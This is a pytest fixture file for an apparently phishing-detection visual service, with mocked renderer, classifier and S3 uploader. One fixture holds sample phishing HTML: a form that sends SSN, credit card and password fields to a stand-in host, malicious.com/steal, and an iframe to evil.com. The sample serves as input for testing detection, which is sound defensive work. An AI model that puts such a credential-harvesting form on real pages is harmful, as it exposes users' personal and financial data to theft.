"""
Pytest configuration and fixtures for Visual service tests
"""
import pytest
from unittest.mock import Mock, MagicMock, patch, AsyncMock
from fastapi.testclient import TestClient
import base64
from PIL import Image
import io

from src.main import app
from src.renderer.page_renderer import PageRenderer
from src.models.cnn_classifier import BrandImpersonationCNN, CNNModelLoader
from src.models.visual_similarity import VisualSimilarityMatcher
from src.utils.s3_uploader import S3Uploader

@pytest.fixture
def client():
    """Create a test client for the FastAPI app"""
    return TestClient(app)

@pytest.fixture
def mock_page_renderer():
    """Create a mock PageRenderer for testing"""
    renderer = Mock(spec=PageRenderer)
    
    # Create a simple test image
    img = Image.new('RGB', (100, 100), color='red')
    img_bytes = io.BytesIO()
    img.save(img_bytes, format='PNG')
    img_bytes = img_bytes.getvalue()
    
    renderer.render_page = AsyncMock(return_value={
        "screenshot": base64.b64encode(img_bytes).decode(),
        "dom": "<html><head><title>Test</title></head><body><h1>Hello</h1></body></html>",
        "status_code": 200,
        "metrics": {
            "width": 1920,
            "height": 1080,
            "scrollHeight": 1080,
            "elementCount": 10
        },
        "url": "https://example.com"
    })
    
    renderer.initialize = AsyncMock()
    renderer.close = AsyncMock()
    
    return renderer

@pytest.fixture
def mock_cnn_model():
    """Create a mock CNN model for testing"""
    model = Mock(spec=BrandImpersonationCNN)
    model.predict.return_value = {
        "predictions": [
            {"brand_id": 0, "probability": 0.85},
            {"brand_id": 1, "probability": 0.10},
            {"brand_id": 2, "probability": 0.05}
        ],
        "top_brand_id": 0,
        "top_brand_probability": 0.85,
        "is_brand_impersonation": True,
        "confidence": 0.85
    }
    model.eval = Mock()
    return model

@pytest.fixture
def mock_cnn_model_loader(mock_cnn_model):
    """Create a mock CNNModelLoader"""
    loader = Mock(spec=CNNModelLoader)
    loader.load_model.return_value = mock_cnn_model
    loader.get_model.return_value = mock_cnn_model
    return loader

@pytest.fixture
def mock_s3_uploader():
    """Create a mock S3Uploader"""
    uploader = Mock(spec=S3Uploader)
    uploader.upload_screenshot.return_value = "https://s3.amazonaws.com/bucket/screenshots/test.png"
    uploader.upload_image.return_value = "https://s3.amazonaws.com/bucket/images/test.png"
    uploader.delete_image.return_value = True
    return uploader

@pytest.fixture
def sample_html():
    """Sample HTML for testing"""
    return """
    <html>
        <head><title>Test Page</title></head>
        <body>
            <form action="/login" method="POST">
                <input type="email" name="email" placeholder="Email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
            <a href="https://external.com">External Link</a>
            <img src="/logo.png" alt="Logo">
        </body>
    </html>
    """

@pytest.fixture
def sample_html_suspicious():
    """Sample HTML with suspicious patterns"""
    return """
    <html>
        <head>
            <style>
                .hidden { display: none; }
                .invisible { opacity: 0; }
            </style>
        </head>
        <body>
            <form action="http://malicious.com/steal" method="POST">
                <input type="text" name="ssn" placeholder="SSN">
                <input type="text" name="credit_card" placeholder="Credit Card">
                <input type="password" name="password">
            </form>
            <iframe src="http://evil.com"></iframe>
        </body>
    </html>
    """

@pytest.fixture
def sample_image_bytes():
    """Create sample image bytes for testing"""
    img = Image.new('RGB', (224, 224), color='blue')
    img_bytes = io.BytesIO()
    img.save(img_bytes, format='PNG')
    return img_bytes.getvalue()

@pytest.fixture
def sample_forms():
    """Sample form data for testing"""
    return [
        {
            "action": "/login",
            "method": "POST",
            "fields": [
                {"type": "email", "name": "email", "placeholder": "Email", "required": True},
                {"type": "password", "name": "password", "placeholder": "Password", "required": True}
            ]
        }
    ]

@pytest.fixture(autouse=True)
def setup_mocks(mock_page_renderer, mock_cnn_model_loader, mock_s3_uploader):
    """Automatically patch components for all tests"""
    with patch('src.api.routes.page_renderer', mock_page_renderer):
        with patch('src.api.routes.cnn_model_loader', mock_cnn_model_loader):
            with patch('src.api.routes.cnn_model', mock_cnn_model_loader.get_model()):
                with patch('src.api.routes.s3_uploader', mock_s3_uploader):
                    with patch('src.main.page_renderer', mock_page_renderer):
                        yield {
                            'page_renderer': mock_page_renderer,
                            'cnn_model_loader': mock_cnn_model_loader,
                            's3_uploader': mock_s3_uploader
                        }
